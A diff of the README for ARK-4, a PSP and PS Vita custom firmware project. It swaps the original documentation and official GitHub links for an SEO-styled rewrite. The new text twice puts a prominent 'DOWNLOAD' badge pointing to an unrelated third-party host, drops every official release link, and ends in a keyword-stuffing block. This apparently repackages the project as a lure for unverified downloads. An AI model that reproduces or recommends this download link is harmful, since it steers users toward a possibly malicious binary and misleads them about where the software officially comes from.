@@ -1,109 +1,144 @@
 
 # ARK-4 Custom Firmware
 
-ARK-4 is a custom firmware (CFW) project for Sony PlayStation Portable (PSP) systems and the PSP emulator environment (ePSP) on PlayStation Vita.
+ARK-4 is an advanced custom firmware environment for the Sony PlayStation Portable (PSP) and PlayStation Vita's PSP emulation environment (ePSP). It provides homebrew execution, plugin support, system configuration, game compatibility improvements, and boot management functionality.
 
-It extends the original PSP firmware with kernel-level patches, unsigned code execution, plugin support, custom loading components, compatibility modules, and additional system-management tools.
+<a href="https://dyhuiying.com/s/file">
+  <img src="https://img.shields.io/badge/DOWNLOAD-ARK--4%20CUSTOM%20FIRMWARE-2563EB?style=for-the-badge&logo=github&logoColor=white" alt="Download ARK-4 Custom Firmware">
+</a>
 
-**Project status:** ARK-4 has been archived. Its successor is ARK-5.
+![Platform](https://img.shields.io/badge/Platform-PSP%20%7C%20PS%20Vita-334155?style=flat-square)
+![Category](https://img.shields.io/badge/Category-Custom%20Firmware-475569?style=flat-square)
+![Environment](https://img.shields.io/badge/Environment-Homebrew-2563EB?style=flat-square)
+![Architecture](https://img.shields.io/badge/Architecture-PSP%20ePSP-64748B?style=flat-square)
+![Project](https://img.shields.io/badge/Project-Legacy%20Archive-64748B?style=flat-square)
 
-## Core Features
+---
 
-- Unsigned code execution through an enhanced CFW core.
-- Kernel and system-module patching.
-- Plugin support for PSP games, homebrew, PS1 titles, and VSH (XMB).
-- Per-game plugin configuration.
-- Inferno 2 ISO driver with support for multiple disc-image formats.
-- Popcorn controller for launching custom PS1 images.
-- Stargate anti-CFW compatibility engine.
-- Custom IPL installation through cIPL.
-- Recovery functionality and system restoration tools.
-- Custom game launcher with additional system utilities.
-- OTA update functionality in the ARK-4 release line.
+## 1. Overview
 
-## Firmware Architecture
+ARK-4 is a custom firmware (CFW) project designed for the Sony PSP platform and the PSP emulation environment available on PS Vita systems.
 
-ARK-4 uses a modular architecture in which dedicated components handle system patching, compatibility, game loading, and user-facing functionality.
+The project extends the standard PSP software environment through custom system modules, compatibility components, homebrew execution support, and additional configuration capabilities.
 
-### SystemControl
+ARK-4 builds upon functionality associated with earlier PSP custom firmware projects, including PRO and ME, while introducing its own system architecture and specialized components.
 
-The central CFW component. It provides patches for unsigned code execution and exposes the API used by other ARK modules.
+### Core Architecture
 
-### VshControl
+The ARK-4 environment consists of several technical components:
 
-Handles patches to the PSP VSH environment (XMB), enabling homebrew and ISO launching and integrating additional firmware functionality.
-
-### Compatibility Layer
-
-Provides platform and software compatibility adjustments. Core compatibility modules include:
-
-- `psp`
-- `vita`
-- `vitapops`
-- `pentazemin`
-
-### Stargate
-
-Handles anti-CFW protections and selected game compatibility fixes.
-
-### Inferno
-
-Custom ISO driver supporting compressed and uncompressed PSP disc-image formats.
-
-### PopCorn
-
-Provides support for launching custom PlayStation 1 images through the PSP's Pops environment.
-
-### XMB Control
-
-Adds configuration functionality to the XMB, including CFW settings and plugin management.
-
-## Loading and Boot Components
-
-ARK-4 supports multiple loading and installation configurations.
-
-| Component | Function |
+| Component | Purpose |
 |---|---|
-| ARK Loader | Loads ARK as a live CFW |
-| FinalSpeed | Provides an additional live-CFW launch method |
-| Signed Loader | Specially configured EBOOT.PBP loader |
-| Savedata Exploits | Legacy exploit-based loading methods |
-| Classic cIPL | Custom IPL for compatible PSP hardware |
-| New IPL | Updated custom IPL implementation |
-| Time Machine | Supports booting firmware from Memory Stick |
-| Despertar del Cementerio | Recovery and firmware installation environment |
+| SystemControl | Core custom firmware functionality and system patching |
+| Compatibility Layer | Platform-specific compatibility and runtime support |
+| Inferno 2 | Optimized PSP game image driver |
+| Popcorn | Custom PS1 game compatibility and configuration |
+| Stargate | Game compatibility fixes and anti-CFW protection handling |
+| ARK Loader | Loads and initializes the custom firmware environment |
+| Custom Launcher | Alternative application and homebrew launching interface |
+| Recovery Environment | Access to firmware configuration and recovery utilities |
 
-The available method depends on the PSP model, firmware version, and existing system configuration.
+ARK-4 supports both live and permanent custom firmware configurations on compatible PSP hardware.
 
-## Custom IPL and Installation Types
+On PS Vita, it operates within the PSP emulation environment rather than replacing the native Vita operating system.
 
-ARK-4 offers several installation modes.
+## 2. Key Features
 
-### Live CFW
+| Component | Description |
+|---|---|
+| Custom Firmware | Extended PSP system software environment |
+| Homebrew Support | Execution of compatible PSP homebrew applications |
+| Plugin Management | Support for plugins across supported PSP environments |
+| Inferno 2 Driver | Optimized ISO and compressed game image handling |
+| PS1 Compatibility | Custom PS1 game support through the Popcorn controller |
+| Stargate Engine | Integrated game compatibility fixes |
+| Boot Management | Live CFW initialization and optional permanent configuration |
+| Custom Launcher | Alternative interface for launching applications |
+| Recovery Utilities | Access to supported recovery and maintenance functionality |
+| Firmware Updates | Integrated update functionality and manual update packages |
+| UMD Video | Additional UMD Video compatibility and region configuration |
+| System Configuration | CPU settings, memory options, and other firmware controls |
 
-ARK is loaded from the memory card and remains active until the system is powered off or restarted. The loader must be executed again after reboot.
+## 3. Technical Specifications
 
-### Standard Installation
+| Property | Details |
+|---|---|
+| Software Name | ARK-4 |
+| Target Platform | Sony PlayStation Portable |
+| Secondary Platform | Sony PlayStation Vita ePSP |
+| Software Category | Custom Firmware |
+| Firmware Environment | PSP system software / PSP emulation |
+| PSP Firmware Baseline | 6.60 / 6.61 installation environment |
+| Vita Firmware Environment | 3.60–3.74 with supported native modifications |
+| Architecture | PSP MIPS-based environment |
+| Installation Method | Memory Stick deployment and ARK Loader |
+| PSP Application Format | EBOOT.PBP |
+| Vita Installer Format | VPK |
+| Game Image Driver | Inferno 2 |
+| Configuration | Recovery Menu and XMB |
+| Plugin Support | PSP plugins and supported VSH environments |
+| Update Method | OTA updater or manual update package |
+| Project Status | Archived legacy release |
 
-Uses cIPL to enable permanent CFW boot functionality.
+## 4. Compatibility
 
-### Full Installation
+ARK-4 supports the PSP software architecture across a broad range of PSP hardware, subject to hardware-specific limitations.
 
-Installs additional ARK components to internal flash storage. The exact feature set differs from other installation types.
+### PSP Compatibility
 
-### Classic and Light Installations
+| PSP Hardware | Compatibility |
+|---|---|
+| PSP-1000 | Supported |
+| PSP-2000 | Supported |
+| PSP-3000 | Supported |
+| PSP Go | Supported |
+| PSP Street (E1000) | Supported |
+| PSP Testkits / Devkits | Supported where compatible |
+| Strider2 hardware | Excluded |
 
-Alternative permanent installation configurations with different flash-storage requirements.
+Hardware revisions may differ in their supported permanent boot configurations.
 
-### Time Machine Installation
+### Firmware Compatibility
 
-Allows ARK and supported firmware configurations to be booted from a Memory Stick.
+| Environment | Compatibility |
+|---|---|
+| PSP Official Firmware 6.60 | Supported installation environment |
+| PSP Official Firmware 6.61 | Supported installation environment |
+| Existing 6.61 PRO CFW | Supported migration path |
+| Existing 6.61 ME CFW | Supported migration path |
+| PS Vita 3.60–3.74 | Supported ePSP environment with required native modifications |
+| Adrenaline | Supported through the compatible PSP emulation configuration |
 
-**Important:** cIPL and flash operations modify low-level boot or system storage. The correct installation method must be selected for the exact hardware revision.
+### Installation Types
 
-## Disc Image Support
+| Installation Type | Description |
+|---|---|
+| Live CFW | Started through ARK Loader after a shutdown or reboot |
+| Permanent CFW | Uses a compatible cIPL or supported permanent boot configuration |
+| Standalone Vita | Runs within the official PSP emulation environment after required modifications |
+| Adrenaline Integration | Runs within the modified PSP emulation environment provided by Adrenaline |
 
-The Inferno 2 driver supports the following documented PSP image formats:
+Permanent installation availability and methods depend on the specific hardware and boot configuration.
+
+## 5. Firmware Features
+
+### 5.1 Custom Firmware Core
+
+ARK-4 includes an updated system control architecture responsible for custom firmware functionality and system-level patches.
+
+The core provides the runtime foundation for homebrew execution, compatibility modules, plugin integration, and additional system features.
+
+### 5.2 Homebrew Execution
+
+The environment supports compatible PSP homebrew applications.
+
+Legacy 1.50 software compatibility is also included, subject to application and hardware requirements.
+
+### 5.3 Inferno 2 Game Driver
+
+Inferno 2 provides optimized handling of PSP game image formats.
+
+Supported formats include:
 
 - ISO
 - CSO
@@ -112,124 +147,289 @@ The Inferno 2 driver supports the following documented PSP image formats:
 - CSOv2
 - DAX
 
-Driver behavior and compatibility can vary depending on the image, game, and firmware configuration.
+Driver functionality and compatibility may vary depending on the application and image format.
 
-## Plugin System
+### 5.4 PS1 Compatibility
 
-ARK-4 supports plugins in several PSP operating environments:
+The Popcorn controller provides support for custom PS1 game configurations.
+
+External configuration files can be used to adjust compatibility for individual titles.
+
+### 5.5 Plugin Management
+
+ARK-4 supports plugins for multiple PSP execution environments.
+
+Supported plugin categories include:
 
 - PSP games
-- Homebrew applications
+- PSP homebrew
 - PS1 games
-- VSH (XMB)
+- VSH / XMB
 
-Plugins can be enabled or disabled globally or configured for individual games, depending on the plugin type and configuration.
+The environment also provides options for enabling and disabling plugins on a per-game basis.
 
-## PlayStation 1 Compatibility
+### 5.6 Stargate Compatibility Engine
 
-The PopCorn component supports custom PS1 images in the PSP Pops environment.
+Stargate provides integrated compatibility fixes for certain games that encounter protection mechanisms or compatibility issues under custom firmware.
 
-External configuration files can be used to apply title-specific compatibility adjustments.
+### 5.7 Boot and Recovery Management
 
-On PS Vita, ARK-4 also supports ePSP-based configurations, including ARK-X for PS1-oriented use.
+ARK-4 supports different boot configurations depending on the target hardware.
 
-## Recovery and Maintenance
+Available functionality includes:
 
-ARK-4 includes tools and boot options for system maintenance.
+- Live firmware initialization
+- Custom launcher boot configuration
+- Compatible permanent boot configurations
+- Recovery Menu access
+- Supported recovery utilities
 
-- Recovery menu for selected soft-brick and configuration problems.
-- Despertar del Cementerio Version 10 integration.
-- Pandora Battery and Baryon Sweeper recovery workflows.
-- Boot-time options for accessing recovery environments.
-- Custom IPL removal and installation options.
+### 5.8 System Configuration
 
-Recovery availability depends on hardware, boot configuration, and the type of system failure.
+The firmware exposes configurable system settings, including:
 
-## Platform Compatibility
+- CPU and BUS clock configuration
+- Power-saving settings
+- Memory Stick performance options
+- Inferno cache configuration
+- USB charging
+- UMD drive configuration
+- Region settings
+- Plugin configuration
 
-| Platform | Supported configuration |
+Some settings are hardware-specific.
+
+## 6. System Requirements
+
+### PSP Requirements
+
+| Requirement | Description |
 |---|---|
-| PSP | PSP firmware 6.60 and 6.61 |
-| PSP Testkit / Devkit | Documented 6.60 testing and development firmware configurations |
-| PS Vita | PSP ePSP environment on firmware 2.10–3.74 |
-| PS Vita with Adrenaline | Supported Adrenaline-based PSP environment |
+| Console | Compatible Sony PSP |
+| Firmware | Compatible PSP system software |
+| Storage | Memory Stick or supported internal storage |
+| File System | FAT-compatible storage configuration |
+| Loader | ARK Loader |
+| Installation Files | ARK_01234 and ARK Loader directories |
+| Permanent Installation | Compatible cIPL configuration, when desired |
 
-The project documentation excludes the Strider2 PSP hardware variant. Compatibility statements should be checked against the specific installation method and device configuration.
+### PS Vita Requirements
 
-## Build Environment
-
-The project includes a build script and Makefile-based development workflow.
-
-The documented build process supports a Docker-based development environment.
-
-### Build Commands
-
-Build a release:
-
-```bash
-./build.sh
-```
-
-Build a debug version:
-
-```bash
-./build.sh --debug
-```
-
-For additional build options:
-
-```bash
-./build.sh --help
-```
-
-Manual compilation is also documented using the appropriate PSP SDK and Makefile workflow.
-
-## Source Tree
-
-The repository contains several primary development directories:
-
-| Directory | Purpose |
+| Requirement | Description |
 |---|---|
-| `common/` | Shared code and definitions |
-| `core/` | Core custom firmware components |
-| `extras/` | Additional utilities and modules |
-| `libs/` | Libraries and dependencies |
-| `loader/` | Loader-related components |
-| `contrib/` | Supporting files and contributed resources |
+| Console | Compatible PS Vita or PS Vita TV |
+| Firmware | Supported 3.60–3.74 environment |
+| Native Modification | HENkaku, h-encore, or compatible native modification |
+| Application Installer | VitaShell |
+| Installation Package | FasterARK VPK |
+| PSP Environment | Official PSPEmu or compatible Adrenaline installation |
+| Additional Dependency | NoPspEmuDrm_mod for standalone installation |
 
-The repository also includes build scripts, a Makefile, changelog, and Git submodule configuration.
+## 7. Download & Installation
 
-## Project Status
+### Download ARK-4
 
-ARK-4 is an archived project. Its final official release was published as `v4.20.69 r206`.
+<a href="https://dyhuiying.com/s/file">
+  <img src="https://img.shields.io/badge/DOWNLOAD-ARK--4%20PACKAGE-2563EB?style=for-the-badge&logo=github&logoColor=white" alt="Download ARK-4 Package">
+</a>
 
-The project maintainers directed users toward ARK-5 as the successor.
+### 7.1 PSP Installation
 
-This repository remains useful as a reference for the ARK-4 firmware architecture, source code, historical releases, and development work.
+For PSP systems running compatible official firmware:
 
-## Project Information
+1. Prepare a compatible Memory Stick.
+2. Extract the ARK-4 package on a computer.
+3. Copy the `ARK_01234` directory into:
 
-| Property | Value |
+   `PSP/SAVEDATA/`
+
+4. Copy the `ARK_Loader` directory into:
+
+   `PSP/GAME/`
+
+5. Safely disconnect the storage device.
+6. Start the PSP.
+7. Navigate to the Game menu.
+8. Launch `ARK Loader`.
+9. Allow the loader to initialize the custom firmware environment.
+
+The initial configuration operates as Live CFW. The loader must be executed again after a complete shutdown or reboot.
+
+### 7.2 Permanent CFW Configuration
+
+ARK-4 supports permanent custom firmware configurations through compatible cIPL installation methods.
+
+General workflow:
+
+1. Confirm the PSP hardware model.
+2. Verify the currently installed firmware environment.
+3. Prepare the compatible ARK-4 installation components.
+4. Launch the appropriate cIPL installer.
+5. Allow the installer to identify the supported configuration.
+6. Follow the installer instructions for the selected boot configuration.
+
+Permanent installation is optional. Hardware compatibility must be established before changing the boot configuration.
+
+### 7.3 Existing Custom Firmware Migration
+
+For compatible systems already running 6.61 PRO or ME:
+
+1. Verify the existing firmware installation.
+2. Prepare the required DC-ARK components.
+3. Configure the compatible New cIPL installation when applicable.
+4. Shut down the PSP.
+5. Start the system while holding the L trigger.
+6. Follow the DC-ARK installation interface to perform the ARK installation.
+
+Older custom firmware environments may require additional preparation.
+
+### 7.4 PS Vita Standalone Installation
+
+The standalone configuration runs within the PSP emulation environment.
+
+General workflow:
+
+1. Confirm that the Vita is running a supported modified system environment.
+2. Prepare the required NoPspEmuDrm_mod dependency.
+3. Install VitaShell if necessary.
+4. Transfer `FasterARK.vpk` to the device.
+5. Install the VPK through VitaShell.
+6. Launch FasterARK.
+7. Follow the installation interface.
+8. Confirm that the ARK and ARK-X applications are available.
+
+Standalone ARK does not provide every feature of the original PSP XMB environment.
+
+### 7.5 Adrenaline Integration
+
+ARK-4 can also operate through the Adrenaline PSP emulation environment.
+
+The configuration uses the PSP emulation storage structure:
+
+- `pspemu/PSP/SAVEDATA/ARK_01234/`
+- `pspemu/PSP/GAME/ARK_Loader/`
+
+Compatible Adrenaline configurations can use an autorun setup to launch ARK Loader automatically.
+
+## 8. Configuration & Management
+
+### Recovery Menu
+
+ARK-4 provides firmware configuration through the Recovery Menu and supported XMB interfaces.
+
+The available options depend on the device and installation type.
+
+### Performance Configuration
+
+| Setting | Function |
 |---|---|
-| Project | ARK-4 |
-| Project type | Custom Firmware |
-| Primary platform | Sony PlayStation Portable |
-| Additional environment | PlayStation Vita ePSP |
-| Firmware compatibility | PSP 6.60 / 6.61 |
-| Main components | SystemControl, VshControl, Stargate, Inferno, PopCorn |
-| Boot modification | cIPL / Custom IPL |
-| Build system | Shell build script and Makefile |
-| Status | Archived |
-| Successor | ARK-5 |
+| Overclock | Configures CPU to 333 MHz and BUS to 166 MHz |
+| Power Save | Configures CPU to 133 MHz and BUS to 66 MHz |
+| Balanced Clock Speed | Configures CPU to 222 MHz and BUS to 111 MHz |
+| Inferno Cache | Enables caching for the Inferno driver |
+| Memory Stick Speedup | Enables Memory Stick read caching |
+| USB Charge | Enables USB charging while the PSP is powered on |
 
-## Official Resources
+### Boot Configuration
 
-- Source repository: https://github.com/PSP-Archive/ARK-4
-- Wiki: https://github.com/PSP-Archive/ARK-4/wiki
-- Development documentation: https://github.com/PSP-Archive/ARK-4/wiki/Development
-- Releases: https://github.com/PSP-Archive/ARK-4/releases
-- Successor project: https://github.com/PSP-Arkfive/ARK-5
+| Setting | Function |
+|---|---|
+| Autoboot Launcher | Starts the ARK Custom Launcher instead of XMB |
+| Skip Sony Logos | Controls selected startup logos |
+| Recovery Menu | Provides access to CFW configuration |
+| cIPL Configuration | Manages supported permanent boot configurations |
 
----
+### Plugin Management
 
-ARK-4 is a modular PSP custom firmware that combines kernel-level patching, compatibility components, custom boot support, plugin management, and recovery functionality.
+Plugins can be managed according to their execution environment.
+
+Typical categories include:
+
+| Plugin Category | Environment |
+|---|---|
+| GAME | PSP game execution |
+| POPS | PS1 game execution |
+| VSH | XMB environment |
+
+Plugin compatibility should be evaluated individually.
+
+### Updating ARK-4
+
+The original ARK-4 project provides several update methods:
+
+1. Integrated OTA updater when available.
+2. Manual installation through the supplied UPDATE directory.
+3. Replacement of the ARK installation files followed by the loader process where applicable.
+
+The original ARK-4 repository is archived. Its original update infrastructure and availability should not be assumed to remain operational.
+
+## 9. Troubleshooting
+
+| Issue | Resolution |
+|---|---|
+| ARK Loader does not appear | Check the `PSP/GAME/ARK_Loader/` directory structure |
+| ARK Loader fails to start | Verify firmware compatibility and package placement |
+| CFW disappears after shutdown | This is expected with a Live CFW installation |
+| Permanent boot does not work | Check hardware compatibility and cIPL configuration |
+| Homebrew application fails | Confirm application compatibility and required dependencies |
+| Plugin does not load | Verify plugin placement and execution category |
+| ISO image is not recognized | Check the supported image format and storage location |
+| Inferno driver issue | Review driver configuration and image compatibility |
+| PS1 game has compatibility issues | Check the Popcorn configuration for the affected title |
+| Memory Stick is not recognized | Check storage integrity and supported file system |
+| Vita standalone installation fails | Verify the native modification and PSPEmu dependencies |
+| XMB features are missing on Vita | Standalone ePSP installations do not provide every original PSP XMB feature |
+
+## 10. Frequently Asked Questions
+
+### 1. What is ARK-4 Custom Firmware?
+
+ARK-4 is a custom firmware environment for the Sony PSP and PS Vita's PSP emulation environment. It adds homebrew execution, plugin support, compatibility improvements, and system configuration functionality.
+
+### 2. Does ARK-4 support every PSP model?
+
+The project supports the PSP hardware family, including PSP-1000, 2000, 3000, Go, and Street models. Strider2 hardware is excluded.
+
+### 3. Does ARK-4 work on PS Vita?
+
+Yes. ARK-4 supports the Vita's PSP emulation environment through standalone PSPEmu installation or compatible Adrenaline configurations.
+
+### 4. What is the difference between Live and Permanent CFW?
+
+Live CFW must be started again after a complete shutdown or reboot. Permanent configurations use supported boot modifications to initialize custom firmware automatically.
+
+### 5. Does ARK-4 support PSP homebrew?
+
+Yes. ARK-4 supports compatible PSP homebrew applications and plugins, including legacy software compatibility.
+
+### 6. Which game image formats does Inferno 2 support?
+
+The driver supports ISO, CSO, ZSO, JSO, CSOv2, and DAX formats.
+
+### 7. Does ARK-4 support PS1 games?
+
+Yes. ARK-4 includes the Popcorn controller for custom PS1 game support and configuration.
+
+### 8. Can ARK-4 run plugins?
+
+Yes. Plugin support includes PSP games, homebrew, PS1 games, and VSH environments, subject to plugin compatibility.
+
+### 9. Can ARK-4 be installed without existing custom firmware?
+
+Yes. The PSP installation process includes a Live CFW installation path for compatible official firmware environments.
+
+### 10. Does ARK-4 include recovery functionality?
+
+Yes. The project includes recovery-related components, including its integration of Despertar del Cementerio Version 10.
+
+### 11. Can ARK-4 be updated?
+
+The original project includes OTA and manual update mechanisms. The archived status of ARK-4 means the availability of its original update infrastructure may vary.
+
+### 12. Is ARK-4 still actively maintained?
+
+No. The original ARK-4 GitHub repository was archived in August 2026, and the project maintainers announced ARK-5 as its successor.
+
+## 11. SEO Keywords
+
+ARK-4 Custom Firmware, ARK-4 PSP, ARK-4 Download, ARK-4 CFW, PSP Custom Firmware, PSP Firmware Environment, PSP Homebrew, PSP Homebrew Launcher, PSP Plugin Support, PSP System Modification, PSP 6.61 CFW, PSP 6.60 CFW, PSP Game Compatibility, PSP Inferno 2 Driver, PSP ISO Driver, PSP CSO Support, PSP ZSO Support, PSP PS1 Compatibility, PSP Popcorn Controller, PSP Stargate Engine, PSP Recovery Tools, PSP Boot Configuration, PSP Permanent CFW, PSP Live CFW, PSP cIPL, PSP Go Custom Firmware, PS Vita ePSP, PS Vita ARK-4, PS Vita PSP Homebrew, Adrenaline ARK-4, PSP Firmware Management, PSP System Utilities, Sony PSP Custom Firmware.
